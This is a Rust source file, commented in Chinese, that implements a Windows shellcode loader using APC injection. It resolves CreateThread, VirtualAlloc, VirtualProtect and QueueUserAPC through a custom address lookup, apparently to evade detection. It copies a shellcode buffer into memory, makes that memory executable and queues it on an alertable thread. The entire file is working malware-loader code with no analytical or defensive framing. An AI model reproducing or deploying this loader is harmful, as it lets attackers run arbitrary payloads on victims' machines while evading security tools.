use std::mem::transmute;
use std::{
    ffi::c_void,
    ptr::copy_nonoverlapping,
};
use windows::core::Result;
use crate::iat::get_function_address;

unsafe extern "system" fn hello(_: *mut c_void) -> u32 {
    // 使用自定义方法获取 SleepEx 地址
    if let Ok(sleep_ex_addr) = get_function_address("kernel32.dll", "SleepEx") {
        let sleep_ex_fn: unsafe extern "system" fn(u32, bool) -> u32 = unsafe { transmute(sleep_ex_addr) };
        unsafe { sleep_ex_fn(INFINITE, true) };
    }
    return 0;
}

pub fn apc(buf: &[u8]) -> Result<()> {
    unsafe {
        // 使用自定义方法获取 CreateThread 地址
        let create_thread_addr = get_function_address("kernel32.dll", "CreateThread")?;
        let create_thread_fn: unsafe extern "system" fn(
            *mut c_void, // lpThreadAttributes
            usize,       // dwStackSize
            Option<unsafe extern "system" fn(*mut c_void) -> u32>, // lpStartAddress
            *mut c_void, // lpParameter
            u32,         // dwCreationFlags
            *mut u32,    // lpThreadId
        ) -> *mut c_void = transmute(create_thread_addr);

        // 创建线程
        let thread_handler = create_thread_fn(
            std::ptr::null_mut(),
            0,
            Some(hello),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        );

        if thread_handler.is_null() {
            return Err(windows::core::Error::from_win32());
        }

        // 使用自定义方法获取 VirtualAlloc 地址
        let virtual_alloc_addr = get_function_address("kernel32.dll", "VirtualAlloc")?;
        let virtual_alloc_fn: unsafe extern "system" fn(
            *mut c_void, // lpAddress
            usize,       // dwSize
            u32,         // flAllocationType
            u32,         // flProtect
        ) -> *mut c_void = transmute(virtual_alloc_addr);

        // 分配内存
        let addr = virtual_alloc_fn(
            std::ptr::null_mut(),
            buf.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if addr.is_null() {
            return Err(windows::core::Error::from_win32());
        }

        // 复制 shellcode
        copy_nonoverlapping(buf.as_ptr() as *mut c_void, addr, buf.len());

        // 使用自定义方法获取 VirtualProtect 地址
        let virtual_protect_addr = get_function_address("kernel32.dll", "VirtualProtect")?;
        let virtual_protect_fn: unsafe extern "system" fn(
            *mut c_void, // lpAddress
            usize,       // dwSize
            u32,         // flNewProtect
            *mut u32,    // lpflOldProtect
        ) -> i32 = transmute(virtual_protect_addr);

        // 修改内存保护属性
        let mut old_protect = 0u32;
        let result = virtual_protect_fn(addr, buf.len(), PAGE_EXECUTE_READ, &mut old_protect);

        if result == 0 {
            return Err(windows::core::Error::from_win32());
        }

        // 使用自定义方法获取 QueueUserAPC 地址
        let queue_user_apc_addr = get_function_address("kernel32.dll", "QueueUserAPC")?;
        let queue_user_apc_fn: unsafe extern "system" fn(
            *mut c_void, // pfnAPC
            *mut c_void, // hThread
            *mut c_void, // dwData
        ) -> u32 = transmute(queue_user_apc_addr);

        // 设置 APC
        let result = queue_user_apc_fn(transmute(addr), thread_handler, std::ptr::null_mut());

        if result == 0 {
            return Err(windows::core::Error::from_win32());
        }

        // 使用自定义方法获取 WaitForSingleObject 地址
        let wait_for_single_object_addr = get_function_address("kernel32.dll", "WaitForSingleObject")?;
        let wait_for_single_object_fn: unsafe extern "system" fn(
            *mut c_void, // hHandle
            u32,         // dwMilliseconds
        ) -> u32 = transmute(wait_for_single_object_addr);

        // 等待线程结束
        wait_for_single_object_fn(thread_handler, INFINITE);
    }
    Ok(())
}

// 常量定义（原来从 windows crate 导入的）
const INFINITE: u32 = 0xFFFFFFFF;
const MEM_COMMIT: u32 = 0x00001000;
const MEM_RESERVE: u32 = 0x00002000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;